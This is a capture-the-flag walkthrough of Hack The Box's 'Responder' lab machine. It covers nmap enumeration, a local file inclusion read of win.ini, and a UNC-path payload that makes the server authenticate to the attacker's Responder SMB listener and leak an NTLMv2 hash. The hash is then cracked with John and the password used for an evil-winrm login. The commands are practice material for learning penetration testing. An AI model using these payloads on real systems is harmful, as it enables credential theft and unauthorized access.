# Introduction

As part of the learning path for beginners, Hack The Box offers a series of machines under the Starting Point Tier 1 category. These are designed to help new users get familiar with the fundamentals of penetration testing in a guided and progressive way. Among them, **Responder** stands out as the first machine that introduces a slightly more complex challenge. Despite its `Very Easy` difficulty rating, solving it requires chaining together a few steps — making it more structured than previous boxes in the path. It's a great opportunity for newcomers to practice building simple attack chains and start developing a more methodical mindset when approaching machines.

# Information Gathering

## Nmap

The first step was to identify open ports and services running on the target. I started with a full `TCP SYN` scan across all 65,535 ports.

```
sudo nmap -sS -p- -T5 10.129.197.98 

PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
```

This revealed two open ports:

- Port 80/tcp – `HTTP`
- Port 5985/tcp – `WSMan (Windows Remote Management)`

Next, I ran a more detailed service and version detection scan on these ports using the default Nmap scripts.

```
sudo nmap -sS -sC -sV -p 80,5985 -T5 10.129.197.98
```

### Port 80 – HTTP

```
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
```

The web server is running `Apache 2.4.52` on a Windows platform, along with `PHP 8.1.1`. The response headers and the use of the `(Win64)` build clearly suggest that the underlying operating system is Windows.

### Port 5985 – WSMan (WinRM)

```
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

This port is associated with `Windows Remote Management (WinRM)` and confirms that the target is running `Microsoft HTTPAPI 2.0`, further verifying the Windows environment.

### Web Technologies

To enumerate the technologies used by the web server, I utilized `Wappalyzer`, which confirmed the same information gathered with Nmap. This reinforced the initial findings and helped validate the target’s technology stack.

![image.png](attachment:aa033ede-9bc6-490b-9cff-92273de9c4d9:image.png)

## Web Enumeration

After identifying that the web server was running `Apache` on Windows at port `80`, I started by browsing the site manually. While there were no useful results from directory brute-forcing with tools like `gobuster`, one particular feature on the homepage caught my attention: a language selection menu. 

![image.png](attachment:7b4cf157-95e9-49f8-8e88-957fbc9349ea:image.png)

Inspecting the URL when changing the language revealed the following pattern:

```
http://unika.htb/index.php?page=german.html
```

This indicated that the page content was likely being dynamically included based on the `page` parameter — a potential sign of `Local File Inclusion (LFI)`. To test for LFI, I modified the `page` parameter to attempt accessing a local system file.

```
http://unika.htb/index.php?page=../../../../../../../windows/win.ini
```

![image.png](attachment:1077fc4a-a3ac-472b-a02d-1e8d1d3d3afb:image.png)

The file was successfully included and displayed in the browser, confirming the presence of an LFI vulnerability. At this point, I knew that the server was vulnerable to arbitrary file inclusion, and I began exploring ways to leverage this vulnerability to move further into the system.

## Deeper Investigation and NTLM Hash Capture via SMB

After confirming the LFI vulnerability, I initially tried to escalate it to a `Remote File Inclusion (RFI)` attack by hosting a malicious web shell via a Python HTTP server, hoping to include it remotely through the vulnerable `page` parameter. Unfortunately, this approach did not work, as the server was not configured to allow RFI.

While digging deeper, I discovered an important detail about how PHP’s `include()` function behaves on Windows systems when given a UNC path (a network share path like `\\10.10.14.249\fakeshare`). When PHP on a Windows system attempts to include a remote file via a UNC path (e.g., `\\10.10.14.249\fakeshare`), the server tries to authenticate to that remote SMB share using `NTLM` authentication.

This behavior can be abused to capture authentication hashes by setting up a malicious SMB server on the attacker’s machine. The target server will automatically send its credentials when attempting to access the share, allowing an attacker to capture NTLM hashes.

To exploit this, I launched `Responder` on my machine to listen and capture NTLM hashes over SMB.

```
sudo responder -I tun0 -d -w
```

Then, I crafted the URL in the vulnerable web parameter to force the server to connect to my machine’s non-existent SMB share.  

```
http://unika.htb/index.php?page=//10.10.14.249/fakeshare
```

As a result, the target machine tried to access the fake SMB share hosted by `Responder`, sending its NTLM authentication hash, which I successfully captured. Among these hashes was the hash for the `Administrator` user.

![image.png](attachment:5f121b43-3729-4de8-a8c1-3fd8828b84bb:image.png)

## Cracking the Captured NTLM Hash

After capturing the NTLM hash of the Administrator account with `Responder`, I saved it into a file named `hash.txt`. The next step was to crack the hash offline to obtain the cleartext password. I used `John the Ripper` setting the `netntlmv2` format options and the popular `rockyou.txt` wordlist.

```
john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2025-05-29 11:31) 33.33g/s 136533p/s 136533c/s 136533C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

The cracking process was very fast, and John successfully recovered the password. With the `Administrator` password in hand, I was now ready to proceed with privileged access to the target machine.

## Accessing the Machine and Retrieving the Flag

With the cracked credentials in hand, I used **`evil-winrm`** to log into the target machine via the `WinRM` service running on port `5985`.

```
evil-winrm -u administrator -p 'badminton' -i 10.129.197.98
```

![image.png](attachment:00ff3809-0994-4c28-9bc6-c3392d9dad32:image.png)

Once inside, I used `PowerShell` to search recursively for the flag file.

```
Get-Childitem -Path c:\ -Recurse -Filter "flag*"

    Directory: C:\Users\mike\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt
```

I navigated to the directory to verify and access the file.

```
cd ../../mike/Desktop
ls

    Directory: C:\Users\mike\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt
```

Finally, I opened the `flag.txt` file to capture the flag and complete the challenge.

## Conclusion

For this walkthrough, I chose to take a different approach than the official Hack The Box methodology. HTB breaks down the `Responder` challenge into eleven guided tasks, leading the user step-by-step with specific questions towards the flag. Instead, I decided to follow a more `black-box methodology`, approaching the machine as a real-world engagement — without hints or a strict path laid out. 

This meant relying on careful enumeration, logical reasoning, and chaining vulnerabilities based on the information uncovered during the whole process. I believe this approach provides a deeper learning experience, helping to develop the skills needed to tackle similar challenges in less guided, more realistic scenarios.

If you’re new to penetration testing, I recommend starting by following the guided HTB path. Then, after some time, come back and try to solve it again on your own to truly sharpen and test your skills.
